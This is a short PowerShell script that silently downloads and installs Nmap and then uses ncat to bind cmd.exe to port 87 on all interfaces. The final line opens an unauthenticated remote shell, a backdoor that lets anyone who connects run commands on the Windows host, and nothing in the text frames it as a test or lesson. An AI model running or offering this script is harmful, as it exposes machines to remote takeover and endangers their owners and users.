Invoke-WebRequest "https://nmap.org/dist/nmap-latest-setup.exe" -OutFile "C:\temp\nmap-setup.exe"
Start-Process "C:\temp\nmap-setup.exe" -ArgumentList "/S" -Wait
Set-Location "C:\Program Files (x86)\Nmap"
cmd /k "ncat -nv 0.0.0.0 87 -e cmd.exe"

